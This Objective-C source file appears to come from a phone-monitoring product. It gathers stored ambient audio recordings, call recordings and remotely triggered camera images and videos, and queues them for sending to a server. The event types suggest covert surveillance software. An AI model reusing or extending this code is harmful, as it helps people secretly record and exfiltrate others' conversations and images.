//
//  NTMediaEventDataProvider.m
//  EDM
//
//  Created by Makara Khloth on 1/17/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "NTMediaEventDataProvider.h"
#import "ProtocolEventConverter.h"

#import "SendEvent.h"

#import "EventResultSet.h"
#import "QueryCriteria.h"

#import "DefDDM.h"

@implementation NTMediaEventDataProvider

- (id) initWithEventRepository: (id <EventRepository>) aEventRepository
			 eventKeysDatabase: (EventKeysDatabase*) aEventKeyDatabase {
	if ((self = [super initWithEventKeysDatabase:aEventKeyDatabase])) {
		mEventRepository = aEventRepository;
	}
	return (self);
}

- (id) commandData {
	// Select events which are no thumbnail but except panic image
	QueryCriteria* queryCriteria = [[QueryCriteria alloc] init];
	[queryCriteria setMMaxEvent:1];
	[queryCriteria setMQueryOrder:kQueryOrderOldestFirst];
	[queryCriteria addQueryEventType:kEventTypeAmbientRecordAudio];
	[queryCriteria addQueryEventType:kEventTypeCallRecordAudio];
	[queryCriteria addQueryEventType:kEventTypeRemoteCameraImage];
	[queryCriteria addQueryEventType:kEventTypeRemoteCameraVideo];
	mEventResultSet = [[mEventRepository mediaNoThumbnailEvents:queryCriteria] retain];
	[queryCriteria release];
	
	mEventIndex = 0;
	mEventCount = [[mEventResultSet mEventArray] count];
	SendEvent* sendEvent = [[SendEvent alloc] init];
	[sendEvent setEventCount:mEventCount];
	[sendEvent setEventProvider:self];
	[sendEvent autorelease];
	return (sendEvent);
}

- (id)getObject {
	id event = [[mEventResultSet mEventArray] objectAtIndex:mEventIndex];
	event = [ProtocolEventConverter convertToPhoenixProtocolEvent:event aFromThumbnail:FALSE];
	mEventIndex++;
	return (event);
}

- (BOOL)hasNext {
	BOOL hasNext = (mEventIndex < mEventCount);
	if (!hasNext) {
		EventKeys* eventKeys = [mEventResultSet shrink];
		[mEventResultSet release];
		mEventResultSet = nil;
		@try {
			[self insertEventKeys:eventKeys andEDPType:kEDPTypeNTMedia];
		}
		@catch (NSException * e) {
			
		}
		@finally {
			
		}
	}
	return (hasNext);
}

- (void) dealloc {
	[mEventResultSet release];
	[super dealloc];
}

@end
